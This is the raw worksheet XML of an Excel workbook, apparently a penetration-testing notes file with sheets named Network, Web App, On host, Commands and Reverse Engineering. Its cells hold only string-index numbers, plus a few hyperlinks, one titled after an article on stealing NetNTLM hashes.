      <c r="E5" s="12" t="s">
        <v>148</v>
      </c>
      <c r="H5" s="12" t="s">
        <v>149</v>
      </c>
      <c r="J5" s="10" t="s">
        <v>147</v>
      </c>
    </row>
  </sheetData>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E388-0D5B-4574-B9C5-0C945BA9368E}">
  <dimension ref="A1:B69"/>
  <sheetViews>
    <sheetView zoomScale="80" zoomScaleNormal="80" workbookViewId="0">
      <pane ySplit="1" topLeftCell="A20" activePane="bottomLeft" state="frozen"/>
      <selection pane="bottomLeft" activeCell="A52" sqref="A52"/>
    </sheetView>
  </sheetViews>
  <sheetFormatPr defaultRowHeight="15" customHeight="1" x14ac:dyDescent="0.3"/>
  <cols>
    <col min="1" max="1" width="175" style="6" bestFit="1" customWidth="1"/>
    <col min="2" max="2" width="18.44140625" style="2" customWidth="1"/>
    <col min="3" max="16384" width="8.88671875" style="2"/>
  </cols>
  <sheetData>
    <row r="1" spans="1:2" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A1" s="4" t="s">
        <v>6</v>
      </c>
      <c r="B1" s="4" t="s">
        <v>71</v>
      </c>
    </row>
    <row r="2" spans="1:2" s="14" customFormat="1" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A2" s="14" t="s">
        <v>151</v>
      </c>
    </row>
    <row r="3" spans="1:2" s="14" customFormat="1" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A3" s="14" t="s">
        <v>152</v>
      </c>
    </row>
    <row r="4" spans="1:2" s="14" customFormat="1" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A4" s="6" t="s">
        <v>20</v>
      </c>
    </row>
    <row r="5" spans="1:2" s="14" customFormat="1" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A5" s="6" t="s">
        <v>19</v>
      </c>
    </row>
    <row r="6" spans="1:2" s="14" customFormat="1" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A6" s="6" t="s">
        <v>153</v>
      </c>
    </row>
    <row r="7" spans="1:2" s="14" customFormat="1" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A7" s="6" t="s">
        <v>23</v>
      </c>
    </row>
    <row r="8" spans="1:2" s="14" customFormat="1" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A8" s="6" t="s">
        <v>154</v>
      </c>
    </row>
    <row r="9" spans="1:2" s="14" customFormat="1" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A9" s="6" t="s">
        <v>155</v>
      </c>
    </row>
    <row r="10" spans="1:2" s="14" customFormat="1" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A10" s="6" t="s">
        <v>66</v>
      </c>
    </row>
    <row r="11" spans="1:2" s="14" customFormat="1" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A11" s="6" t="s">
        <v>68</v>
      </c>
    </row>
    <row r="12" spans="1:2" s="14" customFormat="1" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A12" s="6" t="s">
        <v>30</v>
      </c>
    </row>
    <row r="13" spans="1:2" s="14" customFormat="1" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A13" s="6" t="s">
        <v>156</v>
      </c>
    </row>
    <row r="14" spans="1:2" s="14" customFormat="1" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A14" s="6" t="s">
        <v>65</v>
      </c>
    </row>
    <row r="15" spans="1:2" s="14" customFormat="1" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A15" s="6" t="s">
        <v>157</v>
      </c>
    </row>
    <row r="16" spans="1:2" s="14" customFormat="1" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A16" s="6" t="s">
        <v>70</v>
      </c>
      <c r="B16" s="15" t="s">
        <v>72</v>
      </c>
    </row>
    <row r="17" spans="1:1" s="14" customFormat="1" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A17" s="6" t="s">
        <v>73</v>
      </c>
    </row>
    <row r="18" spans="1:1" s="14" customFormat="1" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A18" s="6" t="s">
        <v>75</v>
      </c>
    </row>
    <row r="19" spans="1:1" s="14" customFormat="1" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A19" s="6" t="s">
        <v>76</v>
      </c>
    </row>
    <row r="20" spans="1:1" s="14" customFormat="1" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A20" s="6" t="s">
        <v>78</v>
      </c>
    </row>
    <row r="21" spans="1:1" s="14" customFormat="1" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A21" s="6" t="s">
        <v>79</v>
      </c>
    </row>
    <row r="22" spans="1:1" s="14" customFormat="1" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A22" s="6" t="s">
        <v>158</v>
      </c>
    </row>
    <row r="23" spans="1:1" s="14" customFormat="1" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A23" s="6" t="s">
        <v>159</v>
      </c>
    </row>
    <row r="24" spans="1:1" s="14" customFormat="1" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A24" s="6" t="s">
        <v>160</v>
      </c>
    </row>
    <row r="25" spans="1:1" s="14" customFormat="1" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A25" s="6" t="s">
        <v>161</v>
      </c>
    </row>
    <row r="26" spans="1:1" s="14" customFormat="1" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A26" s="6" t="s">
        <v>102</v>
      </c>
    </row>
    <row r="27" spans="1:1" s="14" customFormat="1" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A27" s="6" t="s">
        <v>103</v>
      </c>
    </row>
    <row r="28" spans="1:1" s="14" customFormat="1" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A28" s="6" t="s">
        <v>162</v>
      </c>
    </row>
    <row r="29" spans="1:1" s="14" customFormat="1" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A29" s="6" t="s">
        <v>163</v>
      </c>
    </row>
    <row r="30" spans="1:1" s="14" customFormat="1" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A30" s="6" t="s">
        <v>164</v>
      </c>
    </row>
    <row r="31" spans="1:1" s="14" customFormat="1" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A31" s="6" t="s">
        <v>165</v>
      </c>
    </row>
    <row r="32" spans="1:1" s="14" customFormat="1" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A32" s="6" t="s">
        <v>104</v>
      </c>
    </row>
    <row r="33" spans="1:2" s="14" customFormat="1" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A33" s="6" t="s">
        <v>166</v>
      </c>
    </row>
    <row r="34" spans="1:2" s="14" customFormat="1" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A34" s="6" t="s">
        <v>168</v>
      </c>
      <c r="B34" s="15" t="s">
        <v>106</v>
      </c>
    </row>
    <row r="35" spans="1:2" s="14" customFormat="1" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A35" s="6" t="s">
        <v>107</v>
      </c>
    </row>
    <row r="36" spans="1:2" s="14" customFormat="1" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A36" s="6" t="s">
        <v>110</v>
      </c>
    </row>
    <row r="37" spans="1:2" s="14" customFormat="1" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A37" s="6" t="s">
        <v>111</v>
      </c>
    </row>
    <row r="38" spans="1:2" s="14" customFormat="1" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A38" s="6" t="s">
        <v>112</v>
      </c>
    </row>
    <row r="39" spans="1:2" s="14" customFormat="1" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A39" s="6" t="s">
        <v>169</v>
      </c>
    </row>
    <row r="40" spans="1:2" s="14" customFormat="1" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A40" s="6" t="s">
        <v>114</v>
      </c>
    </row>
    <row r="41" spans="1:2" s="14" customFormat="1" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A41" s="6" t="s">
        <v>170</v>
      </c>
    </row>
    <row r="42" spans="1:2" s="14" customFormat="1" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A42" s="6" t="s">
        <v>115</v>
      </c>
    </row>
    <row r="43" spans="1:2" s="14" customFormat="1" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A43" s="6" t="s">
        <v>117</v>
      </c>
    </row>
    <row r="44" spans="1:2" s="14" customFormat="1" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A44" s="6" t="s">
        <v>118</v>
      </c>
    </row>
    <row r="45" spans="1:2" s="14" customFormat="1" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A45" s="6" t="s">
        <v>119</v>
      </c>
      <c r="B45" s="15"/>
    </row>
    <row r="46" spans="1:2" s="14" customFormat="1" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A46" s="6" t="s">
        <v>171</v>
      </c>
      <c r="B46" s="15" t="s">
        <v>120</v>
      </c>
    </row>
    <row r="47" spans="1:2" s="14" customFormat="1" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A47" s="6" t="s">
        <v>121</v>
      </c>
    </row>
    <row r="48" spans="1:2" s="14" customFormat="1" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A48" s="6" t="s">
        <v>172</v>
      </c>
    </row>
    <row r="49" spans="1:2" s="14" customFormat="1" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A49" s="6" t="s">
        <v>127</v>
      </c>
    </row>
    <row r="50" spans="1:2" s="14" customFormat="1" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A50" s="6" t="s">
        <v>118</v>
      </c>
    </row>
    <row r="51" spans="1:2" s="14" customFormat="1" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A51" s="6" t="s">
        <v>128</v>
      </c>
    </row>
    <row r="52" spans="1:2" s="14" customFormat="1" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A52" s="6" t="s">
        <v>173</v>
      </c>
      <c r="B52" s="15" t="s">
        <v>129</v>
      </c>
    </row>
    <row r="53" spans="1:2" s="14" customFormat="1" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A53" s="6" t="s">
        <v>174</v>
      </c>
    </row>
    <row r="54" spans="1:2" s="14" customFormat="1" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A54" s="6" t="s">
        <v>130</v>
      </c>
    </row>
    <row r="55" spans="1:2" s="14" customFormat="1" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A55" s="6" t="s">
        <v>131</v>
      </c>
    </row>
    <row r="56" spans="1:2" s="14" customFormat="1" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A56" s="6" t="s">
        <v>175</v>
      </c>
    </row>
    <row r="57" spans="1:2" s="14" customFormat="1" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A57" s="6" t="s">
        <v>133</v>
      </c>
    </row>
    <row r="58" spans="1:2" s="14" customFormat="1" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A58" s="6" t="s">
        <v>132</v>
      </c>
    </row>
    <row r="59" spans="1:2" s="14" customFormat="1" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A59" s="6" t="s">
        <v>176</v>
      </c>
    </row>
    <row r="60" spans="1:2" s="14" customFormat="1" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A60" s="6" t="s">
        <v>135</v>
      </c>
    </row>
    <row r="61" spans="1:2" s="14" customFormat="1" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A61" s="6" t="s">
        <v>177</v>
      </c>
    </row>
    <row r="62" spans="1:2" s="14" customFormat="1" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A62" s="6" t="s">
        <v>137</v>
      </c>
    </row>
    <row r="63" spans="1:2" s="14" customFormat="1" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A63" s="6" t="s">
        <v>139</v>
      </c>
    </row>
    <row r="64" spans="1:2" s="14" customFormat="1" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A64" s="6" t="s">
        <v>140</v>
      </c>
    </row>
    <row r="65" spans="1:1" s="14" customFormat="1" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A65" s="6" t="s">
        <v>141</v>
      </c>
    </row>
    <row r="66" spans="1:1" s="14" customFormat="1" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A66" s="6" t="s">
        <v>142</v>
      </c>
    </row>
    <row r="67" spans="1:1" s="14" customFormat="1" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A67" s="6" t="s">
        <v>143</v>
      </c>
    </row>
    <row r="68" spans="1:1" s="14" customFormat="1" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A68" s="6" t="s">
        <v>144</v>
      </c>
    </row>
    <row r="69" spans="1:1" s="14" customFormat="1" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A69" s="6" t="s">
        <v>145</v>
      </c>
    </row>
  </sheetData>
  <hyperlinks>
    <hyperlink ref="B16" r:id="rId1" xr:uid="{6B3FE633-0EF5-4C51-91F0-D7DFDB1FCDA1}"/>
    <hyperlink ref="B34" r:id="rId2" display="https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes/" xr:uid="{C6019A46-0869-499D-BB7E-0602BE6AC1C3}"/>
    <hyperlink ref="B46" r:id="rId3" xr:uid="{50DBB3B4-F626-464C-BC31-9716168FB372}"/>
    <hyperlink ref="B52" r:id="rId4" xr:uid="{252B07B8-FDC2-4FA3-BAF4-A5EE6B26C234}"/>
  </hyperlinks>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AFEE-C3BA-4A05-9783-1ED877C22A62}">
  <dimension ref="A1:A2"/>
  <sheetViews>
    <sheetView workbookViewId="0">
      <selection activeCell="A31" sqref="A31"/>
    </sheetView>
  </sheetViews>
  <sheetFormatPr defaultRowHeight="15" customHeight="1" x14ac:dyDescent="0.3"/>
  <cols>
    <col min="1" max="1" width="80.88671875" style="2" bestFit="1" customWidth="1"/>
    <col min="2" max="16384" width="8.88671875" style="2"/>
  </cols>
  <sheetData>
    <row r="1" spans="1:1" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A1" s="4" t="s">
        <v>22</v>
      </c>
    </row>
    <row r="2" spans="1:1" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A2" s="5" t="s">
        <v>105</v>
      </c>
    </row>
  </sheetData>
  <hyperlinks>
    <hyperlink ref="A2" r:id="rId1" xr:uid="{25B30FF4-58A8-452B-B45D-2EE6B55F9F0E}"/>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42D08-FB8B-4BAB-A462-7059BEE8513F}">
  <dimension ref="A1:D3"/>
  <sheetViews>
    <sheetView workbookViewId="0">
      <selection activeCell="D25" sqref="D25"/>
    </sheetView>
  </sheetViews>
  <sheetFormatPr defaultRowHeight="14.4" x14ac:dyDescent="0.3"/>
  <cols>
    <col min="1" max="1" width="12.109375" style="1" bestFit="1" customWidth="1"/>
    <col min="2" max="2" width="13.5546875" style="1" bestFit="1" customWidth="1"/>
    <col min="3" max="3" width="15.5546875" style="1" customWidth="1"/>
    <col min="4" max="4" width="29.6640625" style="1" bestFit="1" customWidth="1"/>
    <col min="5" max="16384" width="8.88671875" style="1"/>
  </cols>
  <sheetData>
    <row r="1" spans="1:4" s="3" customFormat="1" x14ac:dyDescent="0.3">
      <c r="A1" s="3" t="s">
        <v>26</v>
      </c>
      <c r="B1" s="3" t="s">
        <v>25</v>
      </c>
      <c r="C1" s="3" t="s">
        <v>27</v>
      </c>
      <c r="D1" s="3" t="s">
        <v>5</v>
      </c>
    </row>
    <row r="3" spans="1:4" x14ac:dyDescent="0.3">
      <c r="D3"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Network</vt:lpstr>
      <vt:lpstr>Web App</vt:lpstr>
      <vt:lpstr>On host</vt:lpstr>
      <vt:lpstr>Commands</vt:lpstr>
      <vt:lpstr>Misc</vt:lpstr>
      <vt:lpstr>Reverse Engineering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2026-06-23T12:52:04Z</dcterms:created>
  <dcterms:modified xsi:type="dcterms:W3CDTF">2026-07-11T02:55:09Z</dcterms:modified>
</cp:coreProperties>
</file>